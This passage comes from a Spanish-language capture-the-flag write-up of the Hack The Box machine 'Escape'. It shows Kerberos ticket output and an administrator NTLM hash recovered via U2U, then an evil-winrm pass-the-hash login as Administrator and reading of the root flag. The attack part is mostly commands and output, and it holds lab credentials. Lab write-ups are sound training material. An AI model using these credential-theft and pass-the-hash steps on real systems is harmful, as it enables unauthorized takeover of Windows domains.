      EESUQ9+m7Y22w82roPRwjG2hDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3Kj
      BwMFAADhAAClERgPMjAyMzA0MDUwMjQ3NTVaphEYDzIwMjMwNDA1MTI0NzU1WqcRGA8yMDIzMDQxMjAy
      NDc1NVqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  4/4/2023 7:47:55 PM
  EndTime                  :  4/5/2023 5:47:55 AM
  RenewTill                :  4/11/2023 7:47:55 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  RJRD36btjbbDzaug9HCMbQ==
  ASREP (key)              :  D7DB92B28474C13C0F2172CE2F52A8F5

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```
Nos conectamos usando el hash `NTLM`
```bash
❯ evil-winrm -i 10.10.11.202 -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Procedemos a leer la flag.
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
146a3dc7812a7b839f482285b6701f3b
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```


![Hacker ]({{ 'assets/img/commons/escape-writeup/hacker.gif' | relative_url }}){: .center-image }
_ERROLOG.BAK_